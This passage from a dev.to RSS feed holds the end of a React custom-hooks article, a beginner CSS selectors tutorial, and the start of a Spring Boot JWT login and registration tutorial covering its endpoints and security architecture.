&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--e0cI-NLc--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/2184/1%2AdqNkKiuammNRgAoRYgcNOg.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--e0cI-NLc--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/2184/1%2AdqNkKiuammNRgAoRYgcNOg.png" alt="useInput hooks" width="880" height="896"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Check out the useInput sandbox example &lt;a href="https://codesandbox.io/s/useinput-forked-oxzxj?from-embed"&gt;here.&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#usekeybindings"&gt;
  &lt;/a&gt;
  &lt;strong&gt;useKeyBindings&lt;/strong&gt;
&lt;/h2&gt;

&lt;p&gt;useKeyBindings is used to bind pairs of keyboard events and handlers.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--P7Y4jRjH--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/2708/1%2AvwY2vahVW9Mum21_U3oo7g.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--P7Y4jRjH--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/2708/1%2AvwY2vahVW9Mum21_U3oo7g.png" alt="" width="880" height="637"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Sandbox &lt;a href="https://codesandbox.io/s/usekeybindings-97ppz?from-embed"&gt;demo&lt;/a&gt; link.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#useonline"&gt;
  &lt;/a&gt;
  useOnline
&lt;/h2&gt;

&lt;p&gt;useOnline is the status hook used to detect whether the user is online or offline. The return value will be boolean(True or false).&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--8h2ichDQ--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/2708/1%2AeOGE9abzBVe7VVeB7Tbk5g.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--8h2ichDQ--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/2708/1%2AeOGE9abzBVe7VVeB7Tbk5g.png" alt="useOnline hook" width="880" height="380"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Sandbox &lt;a href="https://codesandbox.io/s/useonline-tiqdb?from-embed"&gt;demo&lt;/a&gt;.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#useprevious"&gt;
  &lt;/a&gt;
  usePrevious
&lt;/h2&gt;

&lt;p&gt;usePrevious hook enables you to access the previous value of a variable.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--UlK9Gj03--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/2708/1%2A56QKqpoYXQ6-c8cCFv7KXQ.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--UlK9Gj03--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/2708/1%2A56QKqpoYXQ6-c8cCFv7KXQ.png" alt="usePrevious hook" width="880" height="723"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Sandbox &lt;a href="https://codesandbox.io/s/useprevious-uhjyr?from-embed"&gt;demo.&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#usewindowsize"&gt;
  &lt;/a&gt;
  useWindowSize
&lt;/h2&gt;

&lt;p&gt;The use WindowSize hook is used to return the window size that includes inner height and width and outer height and width.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--vkRvMbpP--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/3288/1%2AcIdzfxBbrr4XBikQjp8Uwg.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--vkRvMbpP--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/3288/1%2AcIdzfxBbrr4XBikQjp8Uwg.png" alt="" width="880" height="737"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Sandbox &lt;a href="https://codesandbox.io/s/usewindowsize-dkl83?from-embed"&gt;demo.&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#useasync"&gt;
  &lt;/a&gt;
  useAsync
&lt;/h2&gt;

&lt;p&gt;&lt;a href="https://github.com/streamich/react-use/blob/master/docs/useAsync.md"&gt;useAsync hook&lt;/a&gt; resolves async function or a function that returns a promise. Here is how we can use it.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--uOMK5dCZ--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/3288/1%2AUHTSqGVogiq7dXiY4si2fg.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--uOMK5dCZ--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/3288/1%2AUHTSqGVogiq7dXiY4si2fg.png" alt="useAsync hook" width="880" height="572"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#usepagevisibility"&gt;
  &lt;/a&gt;
  &lt;strong&gt;usePageVisibility&lt;/strong&gt;
&lt;/h2&gt;

&lt;p&gt;With the page Visibility hook, you can detect whether users are interacting with our website or not. It sends a visibility change event when the user lost focus on the page.&lt;/p&gt;

&lt;p&gt;So the hook can be used to,&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Pause a video on page has lost user focus&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Page title changed&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;To stop HTML canvas animation when the user is not on page&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Send notification or messages to the user on the page is active&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--K-c5QlQQ--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/3288/1%2AwB2B17U8j09Gl_U3GdMVMA.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--K-c5QlQQ--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/3288/1%2AwB2B17U8j09Gl_U3GdMVMA.png" alt="" width="880" height="548"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Feel free to use these modern react hooks you can find more custom hooks in the &lt;a href="https://github.com/streamich/react-use"&gt;react-use&lt;/a&gt; package and&lt;a href="https://github.com/imbhargav5/rooks"&gt; Github rooks&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;So, this is all about React custom hooks. Hope you enjoy this article.&lt;/p&gt;

&lt;p&gt;Want to build a lightweight, scalable, and quality application faster? Try DhiWise- A 100% developer-centric platform to build modern applications with the technology you love.&lt;/p&gt;

&lt;p&gt;Explore more about &lt;a href="https://hubs.la/H0_-wmC0"&gt;DhiWise &lt;/a&gt;and the technologies it support.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://app.dhiwise.com/"&gt;Sign up&lt;/a&gt; Now!&lt;/p&gt;

</description>
      <category>showdev</category>
      <category>react</category>
      <category>javascript</category>
      <category>productivity</category>
    </item>
    <item>
      <title>Introduction to CSS Controls</title>
      <author>elinabey</author>
      <pubDate>Wed, 15 Dec 2021 03:09:20 +0000</pubDate>
      <link>https://dev.to/elinabey/introduction-to-css-controls-408m</link>
      <guid>https://dev.to/elinabey/introduction-to-css-controls-408m</guid>
      <description>&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--u9dt5XAV--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/x1ilhnh43v3nv8ci3u7x.jpg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--u9dt5XAV--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/x1ilhnh43v3nv8ci3u7x.jpg" alt="Introduction to CSS" width="880" height="616"&gt;&lt;/a&gt;In this post we'll see the basic controls of CSS. As we know CSS stands for Cascading Style Sheets. It is used to define the performance of the document which is written in a markup language like HTML. It does the work of division of performance and content which includes diverse layout, colors, and fonts. The separation gives flexibility and also controls the diverse properties which enable multiple web pages to share formatting by specifying proper CSS. The CSS terms are sustained by World Web Consortium. In addition to this, it also provides specific rules which help in another formatting if the content is being obtained from a mobile device. In our last tutorial we discussed &lt;a href="https://dev.to/elinabey/what-is-css-59p"&gt;What is CSS?&lt;/a&gt;.&lt;/p&gt;

&lt;h1&gt;
  &lt;a href="#basic-css-controls"&gt;
  &lt;/a&gt;
  Basic CSS Controls.
&lt;/h1&gt;

&lt;p&gt;1.CSS Syntax:&lt;/p&gt;

&lt;p&gt;There are a set of rules that need to be followed in CSS Controls. The CSS rule-set consists of a selector and a declaration block. The selector is used to point to the HTML tags which users would like to style.&lt;/p&gt;

&lt;p&gt;2.Class Selector: &lt;br&gt;
To select a special class attribute the class selector is used to select the elements from that class. To make use of tags in a particular class a period (.) character is used. It is followed by the name of the class.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight css"&gt;&lt;code&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;h1&lt;/span&gt; &lt;span class="nt"&gt;class&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;"class-selector"&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="nt"&gt;This&lt;/span&gt; &lt;span class="nt"&gt;is&lt;/span&gt; &lt;span class="nt"&gt;Class&lt;/span&gt; &lt;span class="nt"&gt;Selectors&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;h1&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;style&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
  &lt;span class="nc"&gt;.class-selector&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nl"&gt;color&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="no"&gt;blue&lt;/span&gt;&lt;span class="p"&gt;;}&lt;/span&gt;
&lt;span class="o"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;style&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;3.Display:&lt;br&gt;
Many HTML elements are set to this mode of display. By default, the block-level elements take as much space and they cannot be placed on the same line with any other display mode.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight css"&gt;&lt;code&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;h1&lt;/span&gt; &lt;span class="nt"&gt;class&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;"class-selector"&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="nt"&gt;This&lt;/span&gt; &lt;span class="nt"&gt;is&lt;/span&gt; &lt;span class="nt"&gt;Class&lt;/span&gt; &lt;span class="nt"&gt;Selectors&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;h1&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;style&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
  &lt;span class="nc"&gt;.class-selector&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nl"&gt;display&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nb"&gt;block&lt;/span&gt;&lt;span class="p"&gt;;}&lt;/span&gt;
&lt;span class="o"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;style&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;4.ID Selector: &lt;br&gt;
The id selector can use the id of an attribute of an HTML element and help in selecting a specific element.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight css"&gt;&lt;code&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;h1&lt;/span&gt; &lt;span class="nt"&gt;id&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;"class-selector"&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="nt"&gt;This&lt;/span&gt; &lt;span class="nt"&gt;is&lt;/span&gt; &lt;span class="nt"&gt;Class&lt;/span&gt; &lt;span class="nt"&gt;Selectors&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;h1&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;style&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
  &lt;span class="nf"&gt;#class-selector&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nl"&gt;color&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="no"&gt;blue&lt;/span&gt;&lt;span class="p"&gt;;}&lt;/span&gt;
&lt;span class="o"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;style&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;5.Comments:&lt;br&gt;
This CSS Controls are desirable to be used when writing code. Comments are ignored by browsers&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight css"&gt;&lt;code&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;h1&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="nt"&gt;This&lt;/span&gt; &lt;span class="nt"&gt;is&lt;/span&gt; &lt;span class="nt"&gt;Comment&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;h1&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;style&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="c"&gt;/*This is a comment*/&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;style&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;6.Background Color: &lt;br&gt;
The background-color attribute determines the color which is to be set for the background of an element.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight css"&gt;&lt;code&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;h1&lt;/span&gt; &lt;span class="nt"&gt;id&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;"class-selector"&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="nt"&gt;This&lt;/span&gt; &lt;span class="nt"&gt;is&lt;/span&gt; &lt;span class="nt"&gt;background&lt;/span&gt; &lt;span class="nt"&gt;Color&lt;/span&gt; &lt;span class="nt"&gt;Green&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;h1&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;style&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
  &lt;span class="nf"&gt;#class-selector&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nl"&gt;background-color&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="no"&gt;green&lt;/span&gt;&lt;span class="p"&gt;;}&lt;/span&gt;
&lt;span class="o"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;style&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;This post originally published at &lt;a href="https://softcodeon.com/css/introduction-to-css-controls.htm"&gt;What is CSS Controls&lt;/a&gt;. If you want to read in detail visit their.&lt;/p&gt;

&lt;p&gt;I am new to web development and am going to learn and share good content that can help others. If you have any questions please discuss below.&lt;br&gt;
Thank you.&lt;/p&gt;

</description>
      <category>webdev</category>
      <category>beginners</category>
      <category>tutorial</category>
      <category>css</category>
    </item>
    <item>
      <title>Spring Boot Login example</title>
      <author>Tien Nguyen</author>
      <pubDate>Wed, 15 Dec 2021 03:01:00 +0000</pubDate>
      <link>https://dev.to/tienbku/spring-boot-login-example-eid</link>
      <guid>https://dev.to/tienbku/spring-boot-login-example-eid</guid>
      <description>&lt;p&gt;In this tutorial, we're gonna build a Spring Boot Login and Registration example (Rest API) that supports JWT with HttpOnly Cookies. You'll know:&lt;/p&gt;

&lt;ul&gt;
    &lt;li&gt;Appropriate Flow for User Login and Registration with JWT and Cookies&lt;/li&gt;
    &lt;li&gt;Spring Boot Rest Api Architecture with Spring Security&lt;/li&gt;
    &lt;li&gt;How to configure Spring Security to work with JWT&lt;/li&gt;
    &lt;li&gt;How to define Data Models and association for Authentication and Authorization&lt;/li&gt;
    &lt;li&gt;Way to use Spring Data JPA to interact with MySQL Database&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Full Article: &lt;a href="https://www.bezkoder.com/spring-boot-login-example-mysql/"&gt;Spring Boot Login example with JWT and MySQL&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;&lt;span id="Overview"&gt;Overview of Spring Boot Login example&lt;/span&gt;&lt;/h2&gt;

&lt;p&gt;We will build a Spring Boot application in that:&lt;/p&gt;

&lt;ul&gt;
        &lt;li&gt;User can signup new account (registration), or login with username &amp;amp; password.&lt;/li&gt;
        &lt;li&gt;By User's role (admin, moderator, user), we authorize the User to access resources.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;These are APIs that we need to provide:&lt;/p&gt;

&lt;div class="table-wrapper-paragraph"&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Methods&lt;/th&gt;
&lt;th&gt;Urls&lt;/th&gt;
&lt;th&gt;Actions&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;POST&lt;/td&gt;
&lt;td&gt;/api/auth/signup&lt;/td&gt;
&lt;td&gt;signup new account&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;POST&lt;/td&gt;
&lt;td&gt;/api/auth/signin&lt;/td&gt;
&lt;td&gt;login an account&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;POST&lt;/td&gt;
&lt;td&gt;/api/auth/signout&lt;/td&gt;
&lt;td&gt;logout the account&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;GET&lt;/td&gt;
&lt;td&gt;/api/test/all&lt;/td&gt;
&lt;td&gt;retrieve public content&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;GET&lt;/td&gt;
&lt;td&gt;/api/test/user&lt;/td&gt;
&lt;td&gt;access User's content&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;GET&lt;/td&gt;
&lt;td&gt;/api/test/mod&lt;/td&gt;
&lt;td&gt;access Moderator's content&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;GET&lt;/td&gt;
&lt;td&gt;/api/test/admin&lt;/td&gt;
&lt;td&gt;access Admin's content&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;&lt;/div&gt;

&lt;p&gt;The database we will use is MySQL by configuring project dependency &amp;amp; datasource.&lt;/p&gt;

&lt;h2&gt;&lt;span id="Flow"&gt;Flow of Spring Boot Login and Registration example&lt;/span&gt;&lt;/h2&gt;

&lt;p&gt;The diagram shows flow of how we implement User Registration, User Login and Authorization process.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--0fI7QXeT--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/5f40bqgmv6t959orrcze.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--0fI7QXeT--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/5f40bqgmv6t959orrcze.png" alt="spring-boot-login-example-jwt-mysql-flow" width="680" height="480"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;A legal JWT must be stored in &lt;strong&gt;Cookies&lt;/strong&gt; if Client accesses protected resources.&lt;/p&gt;

&lt;p&gt;You will need to implement Refresh Token:&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--jUSfmvBW--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://bezkoder.com/wp-content/uploads/2021/04/spring-boot-refresh-token-jwt-example-flow.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--jUSfmvBW--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://bezkoder.com/wp-content/uploads/2021/04/spring-boot-refresh-token-jwt-example-flow.png" alt="spring-boot-refresh-token-jwt-example-flow" width="700" height="480"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;More details at: &lt;a href="https://bezkoder.com/spring-boot-refresh-token-jwt/"&gt;Spring Boot Refresh Token with JWT example&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;&lt;span id="Architecture"&gt;Spring Boot Rest API Server Architecture with Spring Security&lt;/span&gt;&lt;/h2&gt;

&lt;p&gt;You can have an overview of our Spring Boot Login example with the diagram below:&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--Us-e0C36--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/wf6non1inu3f8iysn5tl.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--Us-e0C36--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/wf6non1inu3f8iysn5tl.png" alt="spring-boot-login-example-jwt-mysql-spring-security-architecture" width="700" height="480"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Now I will explain it briefly.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Spring Security&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;&lt;a href="https://docs.spring.io/spring-security/site/docs/current/api/org/springframework/security/config/annotation/web/configuration/WebSecurityConfigurerAdapter.html"&gt;WebSecurityConfigurerAdapter&lt;/a&gt;&lt;/code&gt; is the crux of our security implementation. It provides &lt;code&gt;&lt;a href="https://docs.spring.io/spring-security/site/docs/current/reference/htmlsingle/#jc-httpsecurity"&gt;HttpSecurity&lt;/a&gt;&lt;/code&gt; configurations to configure cors, csrf, session management, rules for protected resources. We can also extend and customize the default configuration that contains the elements below.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;&lt;a href="https://docs.spring.io/spring-security/site/docs/current/reference/htmlsingle/#tech-userdetailsservice"&gt;UserDetailsService&lt;/a&gt;&lt;/code&gt; interface has a method to load User by &lt;em&gt;username&lt;/em&gt; and returns a &lt;code&gt;UserDetails&lt;/code&gt; object that Spring Security can use for authentication and validation.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;UserDetails&lt;/code&gt; contains necessary information (such as: username, password, authorities) to build an Authentication object.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;&lt;a href="https://docs.spring.io/spring-security/site/docs/current/api/org/springframework/security/authentication/UsernamePasswordAuthenticationToken.html"&gt;UsernamePasswordAuthenticationToken&lt;/a&gt;&lt;/code&gt; gets {username, password} from login Request, &lt;code&gt;AuthenticationManager&lt;/code&gt; will use it to authenticate a login account.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;&lt;a href="https://docs.spring.io/spring-security/site/docs/current/reference/htmlsingle/#core-services-authentication-manager"&gt;AuthenticationManager&lt;/a&gt;&lt;/code&gt; has a &lt;code&gt;DaoAuthenticationProvider&lt;/code&gt; (with help of &lt;code&gt;UserDetailsService&lt;/code&gt; &amp;amp; &lt;code&gt;PasswordEncoder&lt;/code&gt;) to validate &lt;code&gt;UsernamePasswordAuthenticationToken&lt;/code&gt; object. If successful, &lt;code&gt;AuthenticationManager&lt;/code&gt; returns a fully populated Authentication object (including granted authorities).&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;&lt;a href="https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/web/filter/OncePerRequestFilter.html"&gt;OncePerRequestFilter&lt;/a&gt;&lt;/code&gt; makes a single execution for each request to our API. It provides a &lt;code&gt;doFilterInternal()&lt;/code&gt; method that we will implement parsing &amp;amp; validating JWT, loading User details (using &lt;code&gt;UserDetailsService&lt;/code&gt;), checking Authorizaion (using &lt;code&gt;UsernamePasswordAuthenticationToken&lt;/code&gt;).&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;&lt;a href="https://docs.spring.io/spring-security/site/docs/current/api/org/springframework/security/web/AuthenticationEntryPoint.html"&gt;AuthenticationEntryPoint&lt;/a&gt;&lt;/code&gt; will catch authentication error.&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Repository&lt;/strong&gt; contains &lt;code&gt;UserRepository&lt;/code&gt; &amp;amp; &lt;code&gt;RoleRepository&lt;/code&gt; to work with Database, will be imported into &lt;strong&gt;Controller&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Controller&lt;/strong&gt; receives and handles request after it was filtered by &lt;code&gt;OncePerRequestFilter&lt;/code&gt;.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;AuthController&lt;/code&gt; handles signup/login requests&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;TestController&lt;/code&gt; has accessing protected resource methods with role based validations.&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Understand the architecture deeply and grasp the overview more easier:&lt;br&gt;
&lt;a href="https://bezkoder.com/spring-boot-jwt-mysql-spring-security-architecture/"&gt;Spring Boot Architecture for JWT with Spring Security&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;&lt;span id="Technology"&gt;Technology&lt;/span&gt;&lt;/h2&gt;

&lt;ul&gt;
    &lt;li&gt;Java 8&lt;/li&gt;
    &lt;li&gt;Spring Boot 2.6.1 (with Spring Security, Spring Web, Spring Data JPA)&lt;/li&gt;
    &lt;li&gt;jjwt 0.9.1&lt;/li&gt;
    &lt;li&gt;MySQL&lt;/li&gt;
    &lt;li&gt;Maven 3.6.1&lt;/li&gt;
&lt;/ul&gt;

&lt;h2&gt;&lt;span id="Project_Structure"&gt;Project Structure&lt;/span&gt;&lt;/h2&gt;

&lt;p&gt;This is folders &amp;amp; files structure for our Spring Boot Login example:&lt;/p&gt;

